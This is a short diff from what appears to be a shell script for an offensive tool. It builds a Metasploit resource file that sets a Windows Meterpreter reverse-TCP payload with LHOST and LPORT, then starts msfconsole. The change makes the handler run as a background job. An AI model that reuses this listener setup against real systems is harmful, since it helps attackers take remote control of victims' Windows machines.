@@ -538,7 +538,7 @@ code1(){
   echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> resource/handler.rc
   echo "set LHOST $ip" >>  resource/handler.rc
   echo "set LPORT $port" >>  resource/handler.rc
-  echo "exploit " >>  resource/handler.rc
+  echo "exploit -j" >>  resource/handler.rc
   msfconsole -r  resource/handler.rc
 }
 
